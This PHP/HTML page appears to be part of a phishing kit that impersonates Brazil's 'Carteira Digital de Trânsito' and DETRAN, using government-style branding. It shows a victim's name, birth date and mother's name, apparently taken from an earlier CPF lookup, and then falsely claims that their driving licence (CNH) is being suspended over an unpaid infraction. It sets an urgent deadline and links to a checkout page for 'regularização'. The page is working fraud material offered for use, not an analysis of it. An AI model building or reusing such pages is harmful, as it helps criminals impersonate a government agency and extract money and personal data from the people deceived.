<?php
session_start(); // Inicia a sessão

// Verifica se os dados estão disponíveis na sessão
if (!isset($_SESSION['dados_cpf'])) {
    header("Location: ./entrar.html");
    exit;
}

// Obtém os dados da sessão
$dados = $_SESSION['dados_cpf'][0]; // Considera o primeiro item do array de dados

// Limpa a sessão (opcional, caso queira manter os dados por mais tempo, remova isso)
//unset($_SESSION['dados_cpf']);
?>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com"> <!-- ALTERAR -->
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <!-- ALTERAR -->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet"> <!-- ALTERAR -->
    <link rel="stylesheet" href="./../css/app/bootstrap.css">
    <link rel="stylesheet" href="./../css/app/app.css">
    <link rel="stylesheet" href="./../css/pages/blue.css">
    <link rel="stylesheet" href="./../../pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
    <link rel="icon" type="image/x-icon" href="./../image/blue/favicon.png">
    <meta name="csrf-token" content="ZpNYnEnTYR2SPs4EwnIPOjMuuu7egj6x46rvot2t">

    <title>Carteira Digital de Trânsito</title>

    <style>
        body, html {
            font-family: 'Montserrat', sans-serif;

        h1, h2, h3, h4, h5, h6, p, span, a, button, input {
            font-family: 'Roboto', sans-serif !important;
        }

        .font-montserrat {
            font-family: 'Montserrat', sans-serif !important;
        }

        .font-roboto {
            font-family: 'Roboto', sans-serif !important;
        }

        body {
            margin: 0;
            padding: 0;
        }

        p, span, a, button {
            font-weight: 300 !important;
        }

        .text-center.mt-2 {
            text-align: justify;
            font-weight: 300 !important;
            line-height: 1.5;
            font-size: 17px !important;
        }

        .destaque {
            font-weight: 400 !important;
        }

        strong {
            font-weight: 500 !important;
        }

        

        .btn-cta {
            display: inline-block;
            width: 42%;
            padding: 10px 24px;
            background: #1351B4;
            border: none;
            border-radius: 24px;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            text-align: center;
            cursor: pointer;
            transition: background 0.3s;
        }

        .icon {
            margin-right: 0.5rem;
            display: inline-block;
            vertical-align: middle;
        }

        .icon-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 0.8rem;
        }

        .header-icon img {
            width: 14px;
            height: 14px;
        }

        .icon-blue img {
            filter: invert(20%) sepia(47%) saturate(4300%) hue-rotate(230deg) brightness(75%) contrast(120%);

        }

        .icon-purple img {
            filter: invert(33%) sepia(92%) saturate(628%) hue-rotate(243deg) brightness(92%) contrast(101%);
        }

        .btn-cta:hover {
            background: #370A69;
        }

        .box-shadow {
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .text-danger {
            color: #d9534f !important;
        }

        .text-dark {
            color: #343a40 !important;
        }

        .text-center {
            text-align: center;
        }

        .font-weight-600 {
            font-weight: 600;
        }

        .font-weight-700 {
            font-weight: 700;
        }

        .border-grey {
            border-color: #e0e0e0;
        }

        .mt-1 {
            margin-top: 0.5rem;
        }

        .mt-3 {
            margin-top: 1rem;
        }

        .mt-4 {
            margin-top: 1.5rem;
        }

        .mb-1 {
            margin-bottom: 0.25rem;
        }

        .pb-2 {
            padding-bottom: 0.5rem;
        }

        .pb-3 {
            padding-bottom: 1rem;
        }
    }
    </style>

</head>

<body>
    <header class="w-100 py-1 box-shadow px-3 ">
        <div class="max-w-1200 m-0-auto py-2 d-flex justify-content-between align-items-center">
          <img src="./../image/blue/logo.png" alt="" width="110px">
    
          <div class="font-size-14 text-dark font-weight-500 d-none d-lg-flex justify-content-between">
            <div class="d-flex align-items-center">
              <span class="icon icon-blue header-icon">
                  <img src="./../image/fonts_awesome/adjust.svg" alt="Ajuste">
              </span>
              Alto Contraste
            </div>
    
            <div class="ml-5 d-flex align-items-center">
              <span class="icon icon-blue header-icon">
                  <img src="./../image/fonts_awesome/assistive-listening-systems.svg" alt="Assistência">
              </span>
              VLibra
            </div>
          </div>
        </div>
      </header>

    <main class="px-3">
        <section class="w-100 py-1">
            <div class="max-w-1200 m-0-auto mt-3 py-2 d-flex justify-content-center">
                <div class="d-flex flex-column box-shadow p-4 rounded text-dark w-100" style="max-width:420px;">
                    <p class="pb-2 border-bottom border-grey">
                        Por questões de segurança, confirme as informações abaixo:
                    </p>

                    <h5 class="text-dark font-weight-700 font-size-18 mb-3">
                    <?php echo htmlspecialchars($dados['Nome']); ?>
                    </h5>

                    <span >Data Nasc.: <?php echo htmlspecialchars($dados['Data_Nascimento']); ?></span>

                    <span class="mt-1">Mãe:  <?php echo htmlspecialchars($dados['Nome_Mae']); ?></span></span>

                    <span class="mt-1 pb-3 border-bottom border-grey">
          CNH: <strong class="text-danger font-weight-600">EM PROCESSO DE SUSPENSÃO</strong>
        </span>

                    <p class="text-center mt-2">
                        Informamos que o sistema integrado de multas validou uma infração cometida e não contestada a tempo junto ao DETRAN. Caso não seja regularizado até a data 23/11/2024 a CNH será <strong>suspensa</strong>.
                    </p>

                    <span class="text-center">Data da Infração: 14/05/2024.</span>

                    <span class="text-center pb-3 border-bottom border-grey">Status:
          <strong class="text-danger font-weight-600">VENCIDA</strong>
        </span>

                    <p class="font-weight-600 text-dark mt-4 mb-1 text-center destaque">
                        Regularize agora para manter sua CNH
                    </p>


                    <div class="w-100 px-0 d-flex justify-content-end ">
                        <a href="../checkout/regularizacao.php" class="btn-cta mt-3"><strong>Regularizar</strong></a> <!-- VER COMO VAI FICAR ESSE LINK -->
                    </div>
                </div>
            </div>
        </section>
    </main>

    <footer class="">

    </footer>

    <script src="./../../code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="./../../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script>
        function formatCpf(element) {
            const inputCpf = $('input[name=cpf]');

            $(element).val(cpf($(element).val()));
        }

        function cpf(cpf) {
            cpf = cpf.replace(/\D/g, "");
            cpf = cpf.substring(0, 11);
            cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
            cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");

            return cpf;
        }
    </script>

</body>


</html>